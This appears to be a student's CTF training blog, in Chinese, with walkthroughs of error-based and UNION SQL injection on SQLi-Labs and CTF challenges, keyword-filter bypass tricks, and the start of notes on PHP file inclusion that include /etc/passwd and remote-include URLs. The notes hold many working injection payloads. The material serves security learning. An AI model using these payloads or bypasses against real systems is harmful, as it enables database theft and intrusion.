<p><img src="/images/QzpnbmqFVoydvCx7g83cb674nLh.png"></p>
<p>输入一下错误的指令,看下会不会报错,会就是报错注入,不会就是盲注了</p>
<p><img src="/images/Z12dbQlnSopfHNxyCvJcZZoGnwe.png"></p>
<p>会报错,而且看样子是单引号闭合方式,于是采用报错注入</p>
<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT database()))) –+</p>
<p><img src="/images/CSG8bWY5BoZvFGxcfGpcHjjDn0d.png"></p>
<p>知道了当前数据库名是 security,接下来获取一下表名和列名</p>
<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()))</strong>)** –+</p>
<p><img src="/images/TlqsbZY0fovpUXx6n1dcd4u6nOb.png"></p>
<p>看到 flag 这个表名了,接下来看看 flag 这个表里面有什么列</p>
<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(COLUMN_NAME) FROM information_schema.columns WHERE table_schema&#x3D;database() AND table_name&#x3D;’flag’))</strong>)** –+</p>
<p><img src="/images/BWnhbQGUTo170Sx0sqlcfXFInih.png"></p>
<p>有一列叫 flag 的</p>
<p>那下面只需要查看 flag 表中的 flag 列就能得到 flag 了</p>
<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT flag FROM flag))) –+</p>
<p><img src="/images/Ah5obP8FboEN1gxJYjqcECA1nXg.png"></p>
<p>回显了一部分 flag,还得用 SUBSTR 函数回显后半部分,以第 30 字符为起始</p>
<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SUBSTR((SELECT flag FROM flag),30,30)))) –+</p>
<p>这里要看懂括号,任何以指令返回的字符串都要加括号</p>
<p><img src="/images/DUNobyPIsotJ8pxXikjcNZI2nih.png"></p>
<p>前面的 cc 是一开始的第 31 32 字符,所以 flag 应该是前半段加后半段 0622cb</p>
<p>即得完整的 flag!</p>
<h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml 报错注入"></a>updatexml 报错注入</h3><p>与 extractvalue 报错注入原理上相似，但参数不同</p>
<p><img src="/images/OTpXbM1wpox6QJx3KGecoRLMncs.png"></p>
<p>这个函数是用于更新数据的,但是我们只用知道它怎么才能报错,报错回显什么,再利用这个性质就可以了.</p>
<p>与 extractvalue 报错相同,这里也是路径不用&#x2F;开头就会报错,剩下第一,第三个参数瞎填任意字符即可.</p>
<p><img src="/images/WKcNbUPpSoknObxjB86cvxSknJ4.png"></p>
<p>报错也只能回显 32 字符,可以用 SUBSTR 控制字符输出</p>
<p>查看表名,直接 payload:</p>
<p>?id&#x3D;-1’ AND 1&#x3D;UPDATEXML(1,CONCAT(‘~’,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE())),3) –+</p>
<p>对照一下下面的(加了个 GROUP_CONCAT)</p>
<p><img src="/images/M71ubjkWxoCU0RxTCRFcXwjHnwh.png"></p>
<p>这里 SUBSTR 套在了 SELECT 后面,也是一样的,套在 SELECT 前是一样的</p>
<p><img src="/images/ILAab6Zv3oG7UJxHQXkcoQHrnoc.png"></p>
<p>对照一下放 SELECT 前</p>
<p><img src="/images/JtAlboiWtoGLAfxKOxscVl4sn6e.png"></p>
<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor 报错注入"></a>floor 报错注入</h3><h4 id="涉及到的函数"><a href="#涉及到的函数" class="headerlink" title="涉及到的函数"></a>涉及到的函数</h4><p><strong>rand() 随机返回 0 到 1 之间的小数</strong></p>
<p>Select rand() from users; 列 users 有多少行，这个语句便会计算多少次 rand(),并输出为未命名的一列</p>
<p><strong>floor() 小数向下取整数</strong></p>
<p>Select floor(2*rand()); 随机输出 0 或 1</p>
<p><strong>ceiling() 小数向上取整数</strong></p>
<p><strong>concat_ws(1,2,3) 将括号内数据用第 1 个字段连接起来</strong></p>
<p>SELECT concat_ws(‘<del>‘,2,3); 输出 2</del>3</p>
<p>可以看看上面三个命令合一以后的输出结果:</p>
<p><img src="/images/Qs0HbLdfvoxqWrxo0Zicexswnjh.png"></p>
<h5 id="FROM-接管问题"><a href="#FROM-接管问题" class="headerlink" title="*FROM 接管问题"></a>*FROM 接管问题</h5><p><em>注:这里的 from users 管一整个 SELECT 语句,包括 rand(),因此 rand 才可以输出那么多</em></p>
<p><em>所有的 from 都能管一整个 select 语句,例如 SELECT 1,A,3 FROM USERS,就算表 USERS 只有列 A,那</em></p>
<p><em>也能管到 A 并输出 A,而 1,3 直接按数字输出.</em></p>
<p><strong>group by() 对结果集进行分组</strong></p>
<p><strong>as 别名</strong></p>
<p><img src="/images/Uv88bBu6Qoj2iExOkEJcc5C8nac.png"></p>
<p>这里的 as a 是接 concat_ws 的</p>
<p>为 concat_ws 的结果(一整列)起一个别名”a”,也可以理解成列名</p>
<p>from 照常管一整句</p>
<p>group by a 直接只输出 security-0 和 security-1.</p>
<p><img src="/images/JCtIbl2B3oiiYcxaKlZcFqm9ny6.png"></p>
<p><strong>count() 汇总统计数量</strong></p>
<p><img src="/images/EAW6bxNYao7RDqxU0rFc4pZzngP.png"></p>
<p>count(*)管 concat_ws 返回的列,会统计 security-0 和 security-1 出现次数并输出成另一列.</p>
<p><strong>这就是问题所在,因为带 count(*)的如图语句有一定可能性会报错.</strong></p>
<p>这时候 SELECT database()的结果:security 就出来了</p>
<p><img src="/images/KbcIb5H5IolDoZxfX8YcX4XVnPe.png"></p>
<p>其成因是在 <strong>rand()函数的纰漏</strong></p>
<p><img src="/images/WKBPbbvkLoU8jAxxKL9c3ughnMh.png"></p>
<p>(反正这个函数就是会抽风)</p>
<p>而我们需要做的,就是让偶尔变成始终:</p>
<p>让 rand()产生足够多次的计算,使这个报错出现概率逐增</p>
<p>可以将 from 的列改成行数比较多的列,例如 information_schema.tables,让 rand()执行的次数足够多,这样就能让其报错了</p>
<h4 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h4><p>在 rand()括号里面填同样数字,rand()会循环输出一些同样的 0-1 数据</p>
<p>所以 rand(0)会报错,rand(0)就一直会报错,我们 payload 的时候发现 rand(一个数)它一直报错,本题就可以一直用这个数了.</p>
<h4 id="核心语句"><a href="#核心语句" class="headerlink" title="核心语句"></a>核心语句</h4><p>实际上 floor 报错注入的核心语句就是结合 UNION 进行 SELECT,因为无论是 COUNT()函数还是 CONCAT_WS()函数作为最外层的函数,它们总是输出一个完整的列.</p>
<p>?id&#x3D;1’ UNION SELECT 1,COUNT(<em>),CONCAT_WS</em><em>(<em>*’-‘,(SELECT DATABASE()),FLOOR(rand(0&#x2F;1&#x2F;2……)*2)**)</em></em> as name**,3** FROM information_schema.tables GROUP by name <strong>–+</strong></p>
<p>真正需要修改的就是 SELECT DATABASE()，让其输出你想要的数据，并报错出来</p>
<p>这个 as name 是管到 CONCAT_WS 前的 和 COUNT(*)是无关的.最后整个 SELECT 列</p>
<p>注:这里红体划线字,3 要删去,因为 COUNT(*)还输出了一列,一共是输出两列,原本它需要三列,加个 1 就行了</p>
<h4 id="GROUP-CONCAT-问题"><a href="#GROUP-CONCAT-问题" class="headerlink" title="GROUP_CONCAT()问题"></a>GROUP_CONCAT()问题</h4><p>这个语句遇到中间金色字的 GROUP_CONCAT 有时候会因为字符过多就产生 bug 直接不响应</p>
<p>可以换成 CONCAT+LIMIT 来输出整列.</p>
<p>GROUP_CONCAT(USERNAME,’~’,PASSWORD)</p>
<p>&#x3D;CONCAT(USERNAME,’~’,PASSWORD) LIMIT 第 m 行 1(代表输出 1 行)</p>
<p>或者用 substring 限制一下输出的字符量(详见解题示例)</p>
<h3 id="SQLi-Labs-2-解题示例"><a href="#SQLi-Labs-2-解题示例" class="headerlink" title="SQLi-Labs-2 解题示例"></a>SQLi-Labs-2 解题示例</h3><p>我们再用一个示例来巩固 floor 报错,注意这是 UNION 注入的题,但一般只要能报错,UNION 注入的题也能报错注入</p>
<p><img src="/images/GT1qb0Ezao08UhxCG4Dcy2a2nlc.png"></p>
<p>本题是最简单的数字型注入，不用判断闭合方式.</p>
<p><img src="/images/Mn3tbj4sLoXEYUxKovhcMF1pnne.png"></p>
<p><img src="/images/UoAebgwuloZiXyxOngsczQ29nJc.png"></p>
<p>用 ORDER BY 发现列数为 3,调试并检验</p>
<p><img src="/images/NLslbPwUwo90U9xdE5Qc7GFsnwg.png"></p>
<p>这里我们把第二列当做回显列</p>
<p>payload:</p>
<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT DATABASE()),FLOOR(rand(0)*2)) as name<del>,3</del> FROM information_schema.tables GROUP by name –+</p>
<p>用 information_schema.tables 因为它列更多更容易报错了.</p>
<p><strong>这里注意的是 COUNT 前不要带括号</strong></p>
<p><img src="/images/FxNpbvFcKoTmmexqZOmcZVI3nbg.png"></p>
<p>获得 database()的内容’security’</p>
<p>payload:</p>
<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;database()),FLOOR(rand(0)*2)) as name FROM information_schema.tables GROUP by name –+</p>
<p><img src="/images/U4q8bGc46oQJGyx6T15cLPs3nqc.png"></p>
<p>那加个 GROUP_CONCAT</p>
<p>Payload:</p>
<p>?id&#x3D;1’ union select 1,count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
<p><img src="/images/MsXbbl6mboN6LBxwtqocVWZQnKh.png"></p>
<p>直接啥也没报,可能出现了 GROUP_CONCAT 问题,再用 substring 限制一下输出的字符量</p>
<p>?id&#x3D;0’ union select 1,count(*),concat_ws(‘-‘,(select substring(group_concat(table_name),1,20)from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
<p><img src="/images/SzKRbXsKGo7ukexfjLMcsyLKnvf.png"></p>
<p>这样表名就出来了,列名同理,这里就不再赘述.</p>
<h2 id="部分过滤绕过"><a href="#部分过滤绕过" class="headerlink" title="部分过滤绕过"></a>部分过滤绕过</h2><p>这里挑几个 SQL 过滤绕过学习一下.</p>
<p><img src="/images/EFO7bVeD6oXfxmx8iy9chlWjn3e.png"></p>
<h3 id="注释符号过滤"><a href="#注释符号过滤" class="headerlink" title="注释符号过滤"></a>注释符号过滤</h3><p>先看看过滤的源代码</p>
<p><img src="/images/BA4eb0AxZoIVRzx1lUhcgvT4n60.png"></p>
<p>注释符号过滤的方法有很多种。</p>
<p><strong>1.用 and 语句手动闭合单引号</strong></p>
<p>?id&#x3D;1’ AND 1&#x3D;1’</p>
<p>黄底 1’已经完成了闭合,后面 AND 1&#x3D;1’可以和另一个单引号闭合</p>
<p><em>注:如果是数字型就可以不用注释符进行闭合,代码后的–+ 可以省略</em></p>
<p><strong>2.直接用’(不一定可行)</strong></p>
<p>?id&#x3D;1’ ‘</p>
<p>自动把后面那个单引号给闭合了,但这种方式在有的实验不可行.</p>
<p><strong>3.用 or 语句手动闭合单引号</strong></p>
<p>?id&#x3D;1’ or&#x2F;and 1&#x3D;’1</p>
<p>单引号直接闭合等号后面的 1,1&#x3D;1,语法正确.</p>
<p>下面这张图能够更稳定的绕过注释过滤.</p>
<p><img src="/images/ZzKUbEdQco1G9BxikIIcuTL5nt5.png"></p>
<h3 id="And-和-Or-过滤"><a href="#And-和-Or-过滤" class="headerlink" title="And 和 Or 过滤"></a>And 和 Or 过滤</h3><p><img src="/images/GtafbGzkVob8AyxSx1ScGRxrnze.png"></p>
<p>对于 and 和 or 过滤:</p>
<p><strong>1.使用大小写过滤</strong></p>
<p>?id&#x3D;1’ anD 1&#x3D;1–+</p>
<p><strong>2.复写过滤字符</strong></p>
<p>?id&#x3D;1’ an<del>and</del>d 1&#x3D;1 –+</p>
<p><strong>3.用&amp;&amp;(%26%26)取代 and,用 ||(%7C%7C)取代 or</strong></p>
<p>三个方法不一定全部适用,要逐一尝试</p>
<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p><strong>1.用加号代替空格</strong></p>
<p>?id&#x3D;1’+and+1&#x3D;1 –+</p>
<p><strong>2.用 URL 编码代替空格(%0A 更为推荐)</strong></p>
<p><img src="/images/UKoGbnIycouyeNxMPqGchSV7n9g.png"></p>
<p><strong>3.使用括号代替空格的格式</strong></p>
<p><img src="/images/OOVgbajvfopg6txY0DDc7UdvnCd.png"></p>
<p><strong>注意过滤 or 的时候,也会把 information 里面的 or 给过滤了，记得复写!</strong></p>
<h3 id="SELECT-和-UNION-过滤"><a href="#SELECT-和-UNION-过滤" class="headerlink" title="SELECT 和 UNION 过滤"></a>SELECT 和 UNION 过滤</h3><p><strong>1.没过滤注释符时,可插入&#x2F;</strong>&#x2F;**</p>
<p>如这样 uni&#x2F;**&#x2F;on</p>
<p><strong>2.复写单词过滤&#x2F;大小写过滤</strong></p>
<p>同 And&#x2F;Or 过滤</p>
<h3 id="过滤绕过举例"><a href="#过滤绕过举例" class="headerlink" title="过滤绕过举例"></a>过滤绕过举例</h3><p>对于过滤绕过举例,详见 SQL 注入实战第三题</p>
<h1 id="Week4-3-实验-SQL-注入实战"><a href="#Week4-3-实验-SQL-注入实战" class="headerlink" title="*[Week4.3]实验:SQL 注入实战"></a>*[Week4.3]实验:SQL 注入实战</h1><h2 id="SWPUCTF-2024-秋季新生赛-ez-sql"><a href="#SWPUCTF-2024-秋季新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]ez_sql"></a>[SWPUCTF 2024 秋季新生赛]ez_sql</h2><p><img src="/images/NOzRbPc9JoszlqxzhNIcFPUunpC.png"></p>
<p>来到题目,他要你输入 id,这还是 SQL 注入的典型题,我们尝试输入 id&#x3D;1 和 2-1</p>
<p><img src="/images/VouXbgQ5noRixFxSXxocTpbTnwb.png"></p>
<p><img src="/images/Kl7RbNp2OoQFGAxqtrWc8o3Hnch.png"></p>
<p>id 输 2-1 还是当做 2 看待,说明是字符型注入</p>
<p><img src="/images/KkLvbdykgoM68KxpZcWcnGdfnBc.png"></p>
<p>输’1 发现很明显的是单引号闭合</p>
<p>我们先尝试一下报错注入,因为它不用知道列数.</p>
<p>payload:</p>
<p>1’  AND 1&#x3D;UNDATEXML(1,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),3) –+</p>
<p><img src="/images/FI0XbfqLdoCUR4xtCNYcNKYonZf.png"></p>
<p>报错了,经过一系列排除,发现–+ 注释在这个环境不适用,用#可以得到不同的结果</p>
<p><img src="/images/JxrLblc7ro8rZDxNKYKctOV4n4g.png"></p>
<p>这个函数直接报不存在了,换一个 extractvalue</p>
<p>Payload:</p>
<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()))) #</p>
<p><img src="/images/LxwvbUwHnonsVixg4crc3WRunHe.png"></p>
<p>可能是报错的行数多于一行了,用 substr 限定一下</p>
<p>Payload:</p>
<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),1,1)))) #</p>
<p><img src="/images/U4LSbiQWDod89yxIdVfcZfEinrg.png"></p>
<p>还是不行,只能用 UNION 注入了</p>
<p>随后的 UNION 注入过程和 Lab-1 是相同的,故省略.</p>
<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.注释用–+ 还是#随环境改变,不一定哪个方式是一定可行的</p>
<p>2.有的环境不能用报错注入,注入方式需按环境变通</p>
<h2 id="Less-6-解决前一题的-more-than-问题"><a href="#Less-6-解决前一题的-more-than-问题" class="headerlink" title="Less-6(解决前一题的 more than 问题)"></a>Less-6(解决前一题的 more than 问题)</h2><p>很容易判断闭合方式是双引号,而且是个没有回显的报错注入,正当以为要拿 flag 的时候这个提示又出现了:</p>
<p><img src="/images/UUovbjXA0okIfSxGqrvcOX5pnrf.png"></p>
<p>问了下 AI，实际上这并非不允许报错注入</p>
<p>而是 SELECT 的一列他的行数大于 1,也就是 WHERE 没能把他限定在一行,用 GROUP_CONCAT 就能解决</p>
<p>直接来到最后一步</p>
<p>payload:</p>
<p>?id&#x3D;1” AND 1&#x3D;extractvalue(2,CONCAT(‘~’,(SUBSTR((SELECT GROUP_CONCAT(FLAG) FROM flag),16,30)))) –+</p>
<p>这样 flag 就能被正常显示了,还需要用 substr 调整一下</p>
<p>说白了就是用 group_concat 包裹一下列名,注意不要把 from 和 where 给包裹进去了</p>
<p><img src="/images/XMWcbhBVjojRjgxK6qQcx09mn7e.png"></p>
<h3 id="做题启示-1"><a href="#做题启示-1" class="headerlink" title="做题启示"></a>做题启示</h3><p>group_concat 可以解决只能输出一行的问题.</p>
<h2 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h2><p>来到题目,该网站存在严格过滤,是个 SQL 注入的过滤版题型</p>
<p><img src="/images/YfAdb3J8YoEE01xXdmQcHKRhn3d.png"></p>
<p>用户名和密码应该分别对应两个变量的值,我们输入用户名和密码试试看</p>
<p><img src="/images/HVRgbkdRYo15JLxs67wcdQYnnyd.png"></p>
<p>进不去，提示用户名和密码错误</p>
<p><img src="/images/IuFcbQMmVoSOkuxq2DFcjtkOn6H.png"></p>
<p>那试试看错误的语法他会怎么提示,并看看闭合方式.</p>
<p><img src="/images/T0iQbxRDUo5KkZx4d8mcP1YNnhd.png"></p>
<p>这么报错,发现是单引号闭合方式</p>
<p><img src="/images/KHnubCYyZoMLaSxbLOVcQB2XnRe.png"></p>
<p>我们现在任何回显都没得到,先按照做题顺序来,看看怎样才能让他回显</p>
<p><img src="/images/NmFibyQutoypA2x34nEcqr3UnId.png"></p>
<p><img src="/images/PoKkbogq6oQYWMxFDmjc8j8fnXf.png"></p>
<p>UNION SELECT 加号都不见了,推知全被过滤了,前两个用双写,注释用手动闭合绕过吧</p>
<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1 AND 1&#x3D;’1</p>
<p><img src="/images/EMOUbWApeoNq7rxOea4cw36qnSg.png"></p>
<p>前面都没报错,就这里报错了,可能 AND 也被绕过了,试试另一个绕过注释符的方式</p>
<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1**’** (在修改密码的同时始终保证用户名是 1)</p>
<p>用红色单引号手动闭合一下</p>
<p><img src="/images/FvPfbQxfOomHNdxZzscc4Zh7nQb.png"></p>
<p>运行通过了,列数不对,用 SELECT1,2 SELECT1,2,3 都试试,发现 SELECT1,2,3 竟然登陆成功了,且回显位是 2 和 3!!</p>
<p><img src="/images/AGBtbookSofXbdxvPKecVQf9nAp.png"></p>
<p>2 改成 DATABASE()再看看</p>
<p><img src="/images/GyV4bKc9SofVQ1xVW8XcpNnZnXb.png"></p>
<p>好的,正常运行.</p>
<p>那步骤也正常进行:Payload:</p>
<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.tables**’**</p>
<p><img src="/images/TTiEbBQlSoTi14x6G4bcLOEMnpe.png"></p>
<p>information_schema 全没了,过滤了 and,估计也过滤了 or,用复写形式重试.</p>
<p>payload:</p>
<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHEMA.tables**’**</p>
<p><img src="/images/ND7Mbrt2Ao1rMaxWGTRcidoQnAc.png"></p>
<p>还是进不去,估计整个单词都没了,复写一整个单词</p>
<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHINFORMATION_SCHEMAEMA.tables**’**</p>
<p>还是不行,那一个一个试呗,只知道 tables 前面显示不出…</p>
<p>……</p>
<p>死活进不去,到网上搜了下攻略,改了一下代码,发现只有这条才能进 database()的表名</p>
<p>不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错</p>
<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FRFROMOM INFOORRMATION_SCHEMA.tables whwhereere table_schema&#x3D;’geek’<strong>‘</strong></p>
<p>这样 geek 中的表名就全显示出来了</p>
<p><img src="/images/Mv20bYqFIoT27YxXhDdcqpHgnud.png"></p>
<p>查这两个表,依然没看到 flag,于是查看一下所有的数据库名,看看 flag 在哪个数据库</p>
<p>1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata</p>
<p>回显了一个名为 ctf 的数据库,再次查询这个数据库,作重复步骤,就得到了 flag 了</p>
<p><em>(这个靶场不知道是有问题还是咋,后面也一直不给回显(我是正确按照攻略的 payload 操作的),一开始的’’不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错’’也不知道是靶场错误还是真的过滤了什么东西,总之最后没做出来…)</em></p>
<h3 id="做题启示-2"><a href="#做题启示-2" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.输用户名和密码的题目,尽量在密码里面注入,不要在用户名,因为后面还有一个密码会造成一些问题</p>
<p>其他的题目也尽量在最后一个数据注入(一开始对用户名进行 SQL 注入,死活说我 password 有问题…).</p>
<p>2.查数据库:select 1,2,group_concat(schema_name) from information_schema.schemata</p>
<p>3.一开始回显不了也莫慌张,没准 UNION SELECT 1,2,3 就回显了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/04/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/04/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">第三章 文件包含</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-11-04 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-04T12:00:00+08:00">2025-11-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:40:47" itemprop="dateModified" datetime="2026-01-21T01:40:47+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/LuiawEaNhi669LkWNV5cxg9PnOh?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/LuiawEaNhi669LkWNV5cxg9PnOh?from=from_copylink</a></p>
<h1 id="Week3-4-PHP-文件包含漏洞"><a href="#Week3-4-PHP-文件包含漏洞" class="headerlink" title="[Week3.4]PHP 文件包含漏洞"></a>[Week3.4]PHP 文件包含漏洞</h1><p>**文件包含漏洞 **通常出现在动态⽹⻚中，有时候由于⽹站功能需求，会让前端用户选择要包含的⽂件，</p>
<p>⽽开发⼈员⼜没有对要包含的⽂件进⾏安全考虑，⽐如：_对传⼊的⽂件名没有经过合理的校验，或者 _</p>
<p><em>校检被绕过</em>，就导致攻击者可以通过修改⽂件的位置来让后台<em>包含任意⽂件</em>，从⽽导致⽂件包含漏</p>
<p>洞。</p>
<p><u>第一天的学习主要包含:文件包含的概述 文件包含的函数 文件包含的分类以及判断服务器类型的办法</u></p>
<h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><blockquote>
<p>开发人员常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
</blockquote>
<p><strong>文件包含漏洞</strong> 通常出现在<em>动态网页</em>中，有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，比如：<em>对传入的文件名没有经过合理的校验，或者校检被绕过</em>，就导致攻击者可以通过修改文件的位置来让后台<em>包含任意文件</em>，从而导致文件包含漏洞。</p>
<blockquote>
<p>注意：<em>网上常说的文件读取漏洞、文件下载漏洞均可理解为文件包含漏洞。</em></p>
</blockquote>
<p>在 PHP 中常用的文件包含函数有以下四种：</p>
<ul>
<li>include()</li>
</ul>
<p>找不到被包含的文件时只会产生警告，脚本将继续运行。</p>
<ul>
<li>include_once()</li>
</ul>
<p>与 <code>include()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
<ul>
<li>require()</li>
</ul>
<p>找不到被包含的文件时会产生致命错误，并停止脚本运行。</p>
<h3 id="require-的返回值规则："><a href="#require-的返回值规则：" class="headerlink" title="require()_ 的返回值规则：_"></a><em>require()</em>_ 的返回值规则：_</h3><ol>
<li><em>若被引入文件</em><strong>仅包含输出代码</strong><em>（如 <strong>echo</strong>、直接文本）：<strong>这些输出会直接打印到浏览器 &#x2F; 终端</strong>，但 <strong>require()</strong> 本身返回 <strong>1</strong>（成功执行的标识）；</em></li>
<li><em>若被引入文件</em><strong>包含 <strong><strong>return</strong></strong> 语句</strong><em>：<strong>require()</strong> 会返回 <strong>return</strong> 后的值（可是字符串、数组、对象等）；</em></li>
<li><em>若引入失败（文件不存在等）：直接触发致命错误（<strong>E_COMPILE_ERROR</strong>），脚本终止执行（区别于 <strong>include()</strong> 的警告错误）。</em></li>
</ol>
<ul>
<li>require_once()</li>
</ul>
<p>与 <code>require()</code> 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p>
<p>当以上 <em>四种函数</em> 参数可控的情况下，我们需要知道以下两点特性，</p>
<ul>
<li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。</li>
<li>若文件内容不符合 PHP 语法规范则会暴漏其源码。</li>
</ul>
<p><strong>实现读取文件内容的函数还有很多,可自行查表</strong></p>
<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><p>在文件包含中，主要分为 <code>本地</code> 和 <code>远程</code> 两种类别，分类取决于所包含文件位置的不同。这两种分类依赖于 <code>php.ini</code> 中的两个配置项，注意对配置进行更改时，注意 <code>On / Off</code> 开头需大写，其次，修改完配置文件后务必要重启 Web 服务，使其配置文件生效。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen （默认开启）allow_url_include #（默认关闭，远程文件包含必须开启）</span><br></pre></td></tr></table></figure>

<p><img src="/images/TLicbbSDDoDdoxxQuWFc71EFnxc.jpeg"></p>
<p>本地和远程文件包含,文件的地址显示有差异(具体可以查阅 Hello CTF 上面的资料)</p>
<p>本地:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=/etc/passwd</span><br><span class="line">http://127.0.0.1/?filename=./phpinfo.txt</span><br></pre></td></tr></table></figure>

<p>远程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?filename=http://loki.la/ReaDME.md</span><br></pre></td></tr></table></figure>

<h2 id="如何判断服务器类型"><a href="#如何判断服务器类型" class="headerlink" title="如何判断服务器类型"></a>如何判断服务器类型</h2><blockquote>
<p>虽然判断服务器类型的必要性不是很大，因为按照国内比赛的套路来看，题目环境基本为 Linux + Apache，不过还是有必要性说一下思路的。</p>
</blockquote>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>可以尝试读取 <code>/etc/passwd</code> 如果可行则代表操作系统为 Linux，反之为 Windows（注意判断不是百分百正确，不排除可控点存在过滤不允许任意文件包含）</p>
<h3 id="大小写混写"><a href="#大小写混写" class="headerlink" title="大小写混写"></a>大小写混写</h3><p>可以在文件包含读取文件时，利用大小写敏感的特性来判断服务器类型，因为在 Linux 中严格区分大小写，而 Windows 不区分大小写。</p>
<p>如：在 Windows 下你要包含的文件为 <code>lfi.txt</code>，即使你写成 <code>Lfi.txt</code>、<code>lFi.tXT</code> 等形式也可包含成功。</p>
<p><u>第二 三天的学习主要包含文件包含协议与 bypass</u></p>
